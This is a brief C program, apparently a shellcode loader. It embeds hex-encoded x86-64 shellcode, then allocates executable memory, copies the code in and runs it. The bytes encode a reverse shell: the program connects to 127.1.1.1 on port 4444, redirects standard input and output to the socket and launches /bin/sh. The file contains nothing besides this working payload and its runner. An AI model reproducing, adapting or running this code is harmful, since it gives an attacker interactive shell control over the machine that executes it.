#include <stdio.h>
#include <string.h>
#include <sys/mman.h>

char shellcode[] = "\x48\x31\xc0\x48\x31\xff\x48\x31\xd2\x48\x31\xdb\x48\x31\xc9\x48\x31\xf6\xb0\x29\x40\xb7\x02\x40\xb6\x01\xb2\x06\x0f\x05\x50\x41\x58\x48\x83\xec\x08\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x11\x5c\xc7\x44\x24\x04\x7f\x01\x01\x01\x48\x89\xe6\xb2\x10\x41\x50\x5f\xb0\x2a\x0f\x05\x30\xc0\x30\xc0\x04\x21\x41\x50\x5f\x48\x31\xf6\x0f\x05\x30\xc0\x30\xc0\x04\x21\x41\x50\x5f\x40\xb6\x01\x0f\x05\x30\xc0\x30\xc0\x04\x21\x41\x50\x5f\x40\xb6\x02\x0f\x05\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05";
void main() {
    printf("shellcode length: %lu\n", strlen(shellcode));
    void * a = mmap(0, sizeof(shellcode), PROT_EXEC | PROT_READ |
                    PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0);
    ((void (*)(void)) memcpy(a, shellcode, sizeof(shellcode)))();
}